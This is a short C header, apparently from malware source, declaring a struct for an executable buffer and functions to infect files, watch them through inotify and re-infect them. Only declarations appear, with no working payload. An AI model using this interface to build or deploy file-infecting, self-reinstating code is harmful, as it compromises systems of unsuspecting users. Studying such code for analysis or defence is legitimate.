#ifndef INFECT_H
#define INFECT_H

#include <unistd.h>

struct exe_t {
	unsigned char* buf;
	size_t len;
};

extern struct exe_t exe;

int infect_get_inotify_fd();
int infect_init();
void infect_handle_inotify();

pid_t run_reinfect();

#endif
